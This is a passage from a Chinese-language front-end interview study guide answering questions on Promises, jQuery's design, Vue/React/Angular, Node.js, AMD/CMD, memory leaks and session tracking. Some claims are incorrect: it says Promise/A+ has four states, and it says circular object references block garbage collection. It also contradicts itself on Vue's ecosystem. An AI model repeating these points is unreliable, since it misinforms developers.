    // 获取鼠标坐标
    function getMousePosition(event) {
      var x, y;
      if (event.pageX || event.pageY) {
        x = event.pageX;
        y = event.pageY;
      } else {
        x = event.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;
        y = event.clientY + document.body.scrollTop + document.documentElement.scrollTop;
      }
      return { x: x, y: y };
    }
    
    // 兼容性处理
    var event = event || window.event;
    var mousePosition = getMousePosition(event);
    
    // 获取元素样式
    function getComputedStyle(element) {
      if (window.getComputedStyle) {
        return window.getComputedStyle(element, null);
      } else {
        return element.currentStyle;
      }
    }
    
    // 兼容性处理
    var elementStyle = getComputedStyle(element);
    
    // 图片格式兼容性处理
    var img = new Image();
    img.src = 'image.png';
    img.onerror = function() {
      // 图片加载失败，处理兼容性
    };
```

以上示例代码展示了对常见兼容性问题的处理方法，包括事件对象的属性获取、样式获取和图片加载的兼容性处理。在实际开发中，需要根据具体的兼容性问题选择合适的解决方案，并进行兼容性测试和调整。

### 23 说说你对promise的了解

依照 `Promise/A+` 的定义，`Promise` 有四种状态：

  1. `pending`（进行中）: 初始状态，表示异步操作尚未完成。当创建一个 Promise 对象时，它的初始状态就是 pending。
  2. `fulfilled`（已成功）: 表示异步操作已成功完成，并且返回了一个结果值。一旦 Promise 的状态转为 fulfilled，就会调用 `onFulfilled` 回调函数。
  3. `rejected`（已失败）: 表示异步操作执行过程中出现了错误或失败。一旦 Promise 的状态转为 rejected，就会调用 `onRejected` 回调函数。
  4. `settled`（已结束）: 表示 Promise 已经被 resolved（fulfilled 或 rejected）。在 settled 状态下，Promise 的状态已经确定，不会再发生变化。

需要注意的是，Promise 的状态转换是单向的，一旦状态确定后就不可再改变。一开始是 pending，然后可以转为 fulfilled 或
rejected，一旦转换为其中一种状态，就会保持在那个状态，无法再次改变。

以下是一个示例代码，演示 Promise 的不同状态和状态转换过程：
```javascript
    // 创建一个 Promise 对象
    var promise = new Promise(function(resolve, reject) {
      // 异步操作
      setTimeout(function() {
        var randomNum = Math.random();
        if (randomNum > 0.5) {
          resolve('Operation succeeded');
        } else {
          reject('Operation failed');
        }
      }, 1000);
    });
    
    // 使用 Promise 对象
    promise
      .then(function(result) {
        console.log('Success:', result);
      })
      .catch(function(error) {
        console.log('Error:', error);
      })
      .finally(function() {
        console.log('Promise settled');
      });
```

在上面的示例中，我们创建了一个 Promise 对象，并在内部定义了一个异步操作。根据异步操作的结果，调用了 resolve 或 reject 方法来改变
Promise 的状态。然后使用 then 方法注册了成功时的回调函数，使用 catch 方法捕获了错误。最后，使用 finally 方法来注册一个在
Promise 完成后必定会执行的回调函数。

这样，我们就可以通过对 Promise 的状态进行判断和处理，来执行相应的操作。

### 24 你觉得jQuery源码有哪些写的好的地方

  * `jQuery`的源码结构清晰，模块化的设计使得各个功能模块之间相互独立，易于维护和扩展。
  * `jQuery`采用了很多优化技巧，例如使用惰性函数、缓存DOM查询结果、事件委托等，以提高性能和效率。
  * `jQuery`提供了一致而强大的选择器功能，支持多种选择器语法，使得操作DOM元素更加灵活方便。
  * `jQuery`提供了丰富的插件生态系统，使得开发者可以轻松扩展功能，且插件之间可以很好地兼容和组合使用。
  * `jQuery`封装了跨浏览器的解决方案，解决了浏览器兼容性问题，使开发者可以更专注于业务逻辑而不用关心底层实现细节。
  * `jQuery`提供了丰富的DOM操作方法和动画效果，使得开发者可以轻松实现复杂的交互效果。
  * `jQuery`文档详细且易于理解，提供了丰富的示例和用法说明，方便开发者学习和使用。

总的来说，`jQuery`源码在设计和实现上具有很多优秀的地方，使得它成为广泛应用的前端库之一。

以下是一个简单的示例代码，展示了`jQuery`源码中的一些优秀设计和实现：
```javascript
    // 定义一个自执行的匿名函数，将window对象作为局部变量传入，避免作用域链查找
    (function(window, undefined) {
    
      // 定义jQuery构造函数
      var jQuery = function(selector) {
        return new jQuery.fn.init(selector);
      };
    
      // 将原型对象简写为fn，提高代码效率
      jQuery.fn = jQuery.prototype = {
        // 初始化方法
        init: function(selector) {
          // ...
        },
        // 扩展的实例方法
        // ...
      };
    
      // 将jQuery的原型对象赋值给fn，实现链式调用
      jQuery.fn.init.prototype = jQuery.fn;
    
      // ...
    
      // 将jQuery绑定到全局对象window上，提供全局访问
      window.jQuery = window.$ = jQuery;
    
    })(window);
```

这段示例代码展示了`jQuery`源码中的一些优秀设计和实现：

  1. 使用自执行的匿名函数，将`window`对象作为局部变量传入，提高访问`window`对象的效率，同时避免全局污染。
  2. 通过将原型对象简写为`fn`，提高代码效率，同时利用`init`方法作为构造函数，实现链式调用。
  3. 使用原型继承机制，将`jQuery`的原型对象赋值给`fn`，使得实例对象可以直接访问`jQuery`的方法。
  4. 将`jQuery`绑定到全局对象`window`上，使得可以通过`jQuery`或`$`全局变量访问`jQuery`的功能。

这些设计和实现使得`jQuery`具有清晰的结构、高效的代码和易于使用的特性，成为广泛应用的前端库。

### 25 谈谈你对vue、react、angular的理解

继续对比Vue、React和Angular的优缺点对比：

**Vue.js:**

  * 优点： 
    * 简单易学：Vue.js具有简单易学的特点，可以快速上手，适合小型项目或初学者。
    * 响应式数据绑定：Vue.js使用双向数据绑定机制，能够实现数据的自动更新和同步，提高开发效率。
    * 轻量灵活：Vue.js的核心库很小，可以根据需要逐渐引入插件，具有灵活性和可扩展性。
    * 生态系统丰富：Vue.js拥有庞大的社区和生态系统，有大量的第三方库和组件可供使用。
  * 缺点： 
    * 生态系统相对较小：相对于React和Angular，Vue.js的生态系统规模相对较小，可能在某些方面的资源和支持较少。

**Angular:**

  * 优点：

    * 完整的功能集：Angular是一个完整的前端框架，提供了路由、模块化、依赖注入等功能，适用于大型和复杂的应用程序开发。
    * 强大的模板系统：Angular具有强大的模板系统，支持丰富的指令和组件，使开发者可以更轻松地构建复杂的用户界面。
    * 强大的工具支持：Angular提供了强大的开发工具和调试工具，使开发和调试更加便捷。
  * 缺点：

    * 学习曲线较陡峭：相对于Vue.js和React，Angular的学习曲线较陡峭，需要掌握更多的概念和技术。
    * 复杂性较高：由于Angular是一个完整的框架，它的复杂性较高，对于简单项目可能会显得过于臃肿。

**React:**

  * 优点： 
    * 高性能：React使用虚拟DOM技术，能够提高应用程序的性能，减少DOM操作。
    * 组件化开发：React倡导组件化开发，使得代码更加模块化、可维护和可复用。
    * 大而活跃的社区：React拥有庞大而活跃的社区，有大量的第三方库和组件可供使用。
    * 前后端通用：React可以进行服务器端渲染，使得应用程序具有更好的性能和搜索引擎优化。
  * 缺点： 
    * 学习曲线较陡峭：React使用了JSX语法和一些独特的概念，对于新手来说可能需要一定的学习成本。

### 26 Node的应用场景

**特点：**

  1. **基于事件驱动和非阻塞I/O：** Node.js采用事件驱动的编程范式，通过异步非阻塞的I/O模型实现高效的并发处理，能够处理大量的并发连接。
  2. **单线程：** Node.js使用单线程处理请求，避免了传统多线程模型中线程切换的开销，提高了处理请求的效率。
  3. **基于V8引擎：** Node.js使用Google Chrome浏览器中的V8引擎解释执行JavaScript代码，具有高性能和高效的特点。
  4. **跨平台：** Node.js可以在多个操作系统上运行，如Windows、Linux、Mac等。

**优点：**

  1. **高并发性能：** Node.js的事件驱动和非阻塞I/O模型使其能够处理大量并发请求，适用于构建高性能的网络应用。
  2. **快速开发：** Node.js使用JavaScript语言，具有统一的开发语言，使得前端开发人员可以轻松上手进行服务器端开发。
  3. **丰富的模块生态系统：** Node.js拥有庞大的模块生态系统，提供了丰富的第三方模块和工具，可以快速构建复杂的应用程序。
  4. **轻量和高效：** Node.js具有较小的内存占用和快速的启动时间，适合部署在云环境或资源有限的设备上。

**缺点：**

  1. **单线程限制：** Node.js使用单线程处理请求，如果有长时间运行的计算密集型任务或阻塞操作，会导致整个应用程序的性能下降。
  2. **可靠性低：** Node.js在处理错误和异常方面相对较弱，一旦代码某个环节崩溃，整个应用程序都可能崩溃，需要仔细处理错误和异常情况。
  3. **不适合CPU密集型任务：** 由于Node.js的单线程特性，不适合处理需要大量计算的CPU密集型任务，这类任务可能会阻塞事件循环，影响整个应用程序的性能。

**Node.js的应用场景主要包括以下几个方面：**

  1. **服务器端开发：** Node.js在服务器端开发中表现出色。由于其事件驱动、非阻塞的特性，适合处理高并发的网络请求，可以快速构建高性能的网络应用程序，如Web服务器、API服务器、实时聊天应用等。
  2. **实时应用程序：** 基于Node.js的实时应用程序能够实现双向通信，例如实时聊天应用、协作工具、多人游戏等。Node.js的事件驱动模型和非阻塞I/O使得处理大量并发连接变得更加高效。
  3. **命令行工具：** Node.js提供了丰富的API和模块，使得开发命令行工具变得简单和高效。通过Node.js可以编写自定义的命令行工具，用于执行各种任务、自动化流程和脚本处理等。
  4. **构建工具：** Node.js可以用于构建前端的构建工具和任务执行器，如Grunt和Gulp。这些工具利用Node.js的模块化和文件操作能力，帮助开发者自动化地处理代码的编译、压缩、打包等任务。
  5. **代理服务器：** 基于Node.js可以构建高性能的代理服务器，用于代理请求、路由转发、负载均衡等。Node.js的非阻塞I/O使得代理服务器能够同时处理大量的并发请求。

总的来说，Node.js适用于需要处理高并发、实时性要求高、需要构建高性能网络应用的场景。它在Web开发、实时应用、命令行工具等领域都有广泛的应用。

### 27 谈谈你对AMD、CMD的理解

`AMD`（Asynchronous Module Definition）和`CMD`（Common Module
Definition）是用于浏览器端的模块加载规范。它们的目标都是解决模块化开发的问题，提供了异步加载模块的机制，以提高网页的性能和加载速度。

**AMD（Asynchronous Module Definition）**

  * `AMD`是由`RequireJS`提出的一种模块加载规范。
  * `AMD`规范采用异步加载模块的方式，在使用模块之前，需要先定义模块的依赖关系，然后通过回调函数来使用模块。这种方式适用于浏览器环境，可以避免阻塞页面的加载。
  * `AMD`规范使用`define`函数来定义模块，可以指定模块的依赖关系和回调函数。在回调函数中可以获取依赖模块，并进行相应的操作。
  * 示例代码：
```javascript
    define(['module1', 'module2'], function(module1, module2) {
      // 使用module1和module2进行操作
    });
```

**CMD（Common Module Definition）**

  * `CMD`是由`SeaJS`提出的一种模块加载规范。
  * `CMD`规范与`AMD`规范类似，也采用异步加载模块的方式。但与`AMD`不同的是，`CMD`规范在使用模块之前不需要先定义依赖关系，而是在使用时才进行模块的加载。
  * `CMD`规范使用`define`函数来定义模块，可以在回调函数中使用`require`函数来加载依赖模块。
  * 示例代码：
```javascript
    define(function(require) {
      var module1 = require('module1');
      var module2 = require('module2');
      // 使用module1和module2进行操作
    });
```

总体来说，`AMD`和`CMD`都是用于浏览器端的模块加载规范，目的是解决模块化开发的问题。它们的区别在于模块定义和加载的时机不同，`AMD`在定义时就指定依赖关系并加载模块，而`CMD`在使用时才加载模块。根据具体的项目需求和团队的开发习惯，可以选择适合的规范进行模块化开发。

### 28 那些操作会造成内存泄漏

除了之前提到的操作，以下是更多可能导致内存泄漏的操作，并附带示例代码：

**1\. 定时器未清理：**
```javascript
    function startTimer() {
      setInterval(() => {
        // 定时操作
      }, 1000);
    }
    
    // 没有清理定时器，导致内存泄漏
```

解决方法：在不需要定时器时，使用 `clearInterval` 或 `clearTimeout` 清理定时器。

**2\. 异步操作未完成导致回调函数未执行：**
```javascript
    function fetchData(callback) {
      // 异步操作，例如 AJAX 请求或数据库查询
    
      // 忘记调用回调函数，导致内存泄漏
    }
    
    // 示例中没有调用 fetchData 的回调函数
```

解决方法：确保异步操作完成后，调用相应的回调函数，或使用 `Promise` 或 `async/await` 等方式管理异步操作的状态。

**3\. DOM 元素未正确移除：**
```javascript
    function createDOMElement() {
      const element = document.createElement('div');
      // 在页面中插入 element，但没有移除
    
      // 该函数可能被多次调用，导致大量无用的 DOM 元素存在于内存中
    }
```

解决方法：在不需要的时候，使用 `removeChild` 或其他方法将 DOM 元素从页面中移除。

**4\. 未释放闭包中的引用：**
```javascript
    function createClosure() {
      const data = 'sensitive data';
    
      setTimeout(() => {
        console.log(data);
      }, 1000);
    
      // 闭包中引用了外部的 data 变量，导致 data 无法被垃圾回收
    }
```

解决方法：在不需要使用闭包中的外部变量时，确保取消引用，例如将闭包中的引用设置为 `null`。

除了之前提到的操作，以下是更多可能导致内存泄漏的操作，并附带示例代码：

**5\. 未正确释放事件监听器：**
```javascript
    function addEventListener() {
      const element = document.getElementById('myElement');
      element.addEventListener('click', () => {
        // 事件处理程序
      });
    
      // 没有移除事件监听器，导致内存泄漏
    }
```

解决方法：在不需要监听事件时，使用 `removeEventListener` 方法将事件监听器移除。

**6\. 大量数据缓存导致内存占用过高：**
```javascript
    function cacheData() {
      const data = fetchData(); // 获取大量数据
      // 将数据存储在全局变量或其他长久存在的对象中
    
      // 数据缓存过多，占用大量内存资源
    }
```

解决方法：及时清理不再需要的数据缓存，或使用适当的数据存储方案，例如使用数据库等。

**7\. 循环引用：**
```javascript
    function createCircularReference() {
      const obj1 = {};
      const obj2 = {};
    
      obj1.ref = obj2;
      obj2.ref = obj1;
    
      // obj1 和 obj2 彼此引用，导致无法被垃圾回收
    }
```

解决方法：确保循环引用的对象在不再需要时被解除引用，例如将相应的属性设置为 `null`。

**8\. 未正确释放资源：**
```javascript
    function openResource() {
      const resource = openSomeResource();
    
      // 忘记关闭或释放 resource，导致资源泄漏
    }
```

解决方法：在不再需要使用资源时，确保关闭、释放或销毁相应的资源，例如关闭数据库连接、释放文件句柄等。

### 29 web开发中会话跟踪的方法有哪些

在Web开发中，常见的会话跟踪方法包括：

**1\. Cookie：**

  * 使用HTTP Cookie来跟踪会话状态，将会话信息存储在客户端。

示例代码：
```javascript
    // 设置Cookie
    document.cookie = "sessionID=abc123; expires=Sat, 31 Dec 2023 23:59:59 GMT; path=/";
    
    // 读取Cookie
    var sessionID = document.cookie;
```

**2\. Session：**

  * 使用服务器端的会话管理机制，在服务器端存储会话数据，客户端通过会话ID来进行访问。

示例代码（使用Express.js框架）：
```javascript
    // 在服务器端设置Session
    app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true }));
    
    // 在路由处理程序中存储和访问Session数据
    req.session.username = 'poetry';
    var username = req.session.username;
```

**3\. URL重写：**

  * 在URL中附加会话标识符来进行会话跟踪。

示例代码：
```javascript
    https://example.com/page?sessionID=abc123
```

**4\. 隐藏Input：**

  * 在HTML表单中使用隐藏的输入字段来存储会话信息。

示例代码：
```html
    <input type="hidden" name="sessionID" value="abc123">
```

**5\. IP地址：**

  * 根据客户端的IP地址进行会话跟踪，但这种方法可能受到共享IP、代理服务器等因素的影响。

示例代码（使用Node.js）：
```javascript
    var clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
```
